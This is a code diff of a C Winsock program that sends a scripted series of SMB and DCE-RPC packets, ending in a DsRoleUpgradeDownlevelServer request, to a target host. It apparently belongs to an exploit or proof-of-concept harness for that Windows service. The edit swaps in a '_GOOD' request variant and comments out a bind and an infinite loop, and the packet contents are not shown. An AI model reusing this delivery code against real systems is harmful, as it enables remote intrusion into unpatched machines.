@@ -35,22 +35,22 @@ int main()
 	int timeout = 5000; // milliseconds
 	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
 
-	//make it so that the port can be reused immidiately
-	int opt = 0; 
-	setsockopt(sock, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (const char*)&opt, sizeof(opt));
+	////make it so that the port can be reused immidiately
+	//int opt = 0; 
+	//setsockopt(sock, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (const char*)&opt, sizeof(opt));
 
-	// Bind to local IP and port
-	struct sockaddr_in localAddress;
-	localAddress.sin_family = AF_INET;
-	localAddress.sin_port = htons(localPort);
-	inet_pton(AF_INET, localIP, &localAddress.sin_addr);
+	//// Bind to local IP and port
+	//struct sockaddr_in localAddress;
+	//localAddress.sin_family = AF_INET;
+	//localAddress.sin_port = htons(localPort);
+	//inet_pton(AF_INET, localIP, &localAddress.sin_addr);
 
-	if (bind(sock, (struct sockaddr*)&localAddress, sizeof(localAddress)) != 0) 
-	{
-		printf("[*] bind failed  %i\r\n", WSAGetLastError());
-		closesocket(sock);
-		return 1;
-	}
+	//if (bind(sock, (struct sockaddr*)&localAddress, sizeof(localAddress)) != 0) 
+	//{
+	//	printf("[*] bind failed  %i\r\n", WSAGetLastError());
+	//	closesocket(sock);
+	//	return 1;
+	//}
 
 	
 	struct sockaddr_in targetAddress;
@@ -74,7 +74,7 @@ int main()
 	SendPacket(sock, (char*)SMB_CONNECT_ANDX_REQUEST_PACKET, sizeof(SMB_CONNECT_ANDX_REQUEST_PACKET));
 	SendPacket(sock, (char*)SMB_NT_CREATE_ANDX_REQUEST_PACKET, sizeof(SMB_NT_CREATE_ANDX_REQUEST_PACKET));
 	SendPacket(sock, (char*)DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET));
-	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET));
+	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_GOOD, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_GOOD));
 
 
 
@@ -83,13 +83,13 @@ int main()
 	closesocket(sock);
 	WSACleanup();
 
-	while (true)
-	{
-		__asm
-		{
-			nop
-		}
-	}
+	//while (true)
+	//{
+	//	__asm
+	//	{
+	//		nop
+	//	}
+	//}
 
 	return 1;
 }
